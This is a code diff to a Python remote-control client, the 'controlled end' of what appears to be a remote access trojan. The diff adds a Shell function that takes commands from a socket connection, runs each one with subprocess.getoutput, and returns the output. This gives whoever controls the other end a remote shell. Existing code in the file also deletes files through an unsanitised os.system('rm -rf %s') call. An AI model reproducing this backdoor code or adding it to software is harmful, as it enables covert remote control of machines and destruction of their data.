@@ -5,6 +5,7 @@
 import socket
 import time
 import os
+import subprocess
 
 # 变量定义 ACTIVE 是否主动连接控制端 / TEMP 临时文件路径 / SYS 被控端系统类型 / PATH 被控端文件管理当前路径
 ACTIVE = 1
@@ -188,6 +189,18 @@ def Del(sock):
     os.system('rm -rf %s' % name)
     return
 
+# shell
+def Shell(sock):
+    while True:
+        d = sock.recv(1024)
+        cmd = d.decode('utf-8')
+        if cmd == 'exit':
+            break
+        else:
+            res = subprocess.getoutput('%s' % cmd)
+            Send(res,sock)
+    return
+
 # 主程序
 if ACTIVE == 0:
     s = Passive()
@@ -226,4 +239,6 @@ while True:
         DownDic(s)
     elif d == b'3x03':
         Del(s)
+    elif d == b'4':
+        Shell(s)
 s.close()
